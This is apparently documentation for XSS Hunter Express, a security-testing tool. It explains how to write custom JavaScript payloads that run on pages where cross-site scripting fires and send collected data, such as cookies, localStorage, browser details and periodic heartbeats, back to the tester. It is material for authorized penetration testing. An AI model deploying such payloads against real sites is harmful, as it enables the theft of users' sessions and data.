# Custom Payload Creation Guide

## Overview

XSS Hunter Express allows you to create custom JavaScript payloads that collect specific data from compromised pages. This guide explains how to create your own payloads and use the available APIs.

## Quick Start

Custom payloads are JavaScript files that can collect additional data beyond the default XSS Hunter collection (cookies, localStorage, DOM, screenshot). You have two main functions available:

1. **`addCustomData()`** - For initial data collection (runs before payload fires)
2. **`sendBackgroundData()`** - For continuous monitoring (runs after payload fires)

## API Functions

### addCustomData(dataObject)

Adds custom data to the initial XSS payload fire report.

**When to use:** For one-time data collection that should be included in the initial report.

**Required structure:**
```javascript
{
  title: String,  // REQUIRED: Display name for this data
  data: Object    // REQUIRED: Any JSON-serializable data
}
```

### sendBackgroundData(dataObject) 

Sends additional data after the initial payload has fired.

**When to use:** For continuous monitoring, periodic updates, or delayed data collection.

**Required structure:**
```javascript
{
  title: String,  // REQUIRED: Display name for this data  
  data: Object    // REQUIRED: Any JSON-serializable data
}
```

**Important:** `sendBackgroundData()` requires `window.xssPayloadId` to be available (set automatically after initial payload fires).

## Simple Examples

### Example 1: Basic Custom Data Collection

```javascript
// simple_user_info.js
// Collect basic user information with the initial payload

window.addCustomData({
  title: "User Information",
  data: {
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
    screenSize: screen.width + 'x' + screen.height,
    timestamp: new Date().toISOString()
  }
});
```

### Example 2: Background Monitoring

```javascript
// simple_heartbeat.js
// Send periodic updates after initial payload fires

setTimeout(function waitForPayload() {
  if (!window.xssPayloadId) {
    setTimeout(waitForPayload, 1000);
    return;
  }
  
  // Send heartbeat every 5 seconds
  setInterval(function() {
    window.sendBackgroundData({
      title: "Heartbeat",
      data: {
        status: "Page active",
        url: location.href,
        time: new Date().toISOString()
      }
    });
  }, 5000);
}, 2000);
```

## Requirements & Best Practices

### Requirements
- Both `title` and `data` fields are **mandatory**
- `title` must be a non-empty string
- `data` must be JSON-serializable (no functions, undefined, or circular references)

### Best Practices
✅ **DO:**
- Keep payloads focused on specific data collection goals
- Use try-catch blocks to handle errors gracefully
- Truncate long strings to avoid excessive data
- Test payloads locally before deployment
- Use descriptive titles for easy identification

❌ **DON'T:**
- Create infinite loops or memory leaks
- Send excessive data that could crash the browser
- Include non-serializable objects (functions, DOM elements)
- Forget error handling

## Using Custom Payloads

1. **Create your payload:** Write JavaScript code following the examples above
2. **Add and activate the script:** Use the Payload Console within the UI
3. **Automatic inclusion:** Payloads will be included in your probe and loaded whenever XSS executes
4. **View results:** Check the admin panel under "Custom Scripts Data" in the XSS report

## Troubleshooting

**Data not appearing?**
- Verify both `title` and `data` fields are present
- Check browser console for JavaScript errors
- Ensure data is JSON-serializable
- For background data, confirm `window.xssPayloadId` exists

**Background monitoring not working?**
- Make sure to wait for `window.xssPayloadId` before calling `sendBackgroundData()`
- Check that the initial payload fired successfully
- Verify network connectivity remains active

## Security Notice

These payloads are for authorized security testing only. Always:
- Obtain proper authorization before testing
- Follow responsible disclosure practices
- Protect any collected sensitive data
- Comply with applicable laws and regulations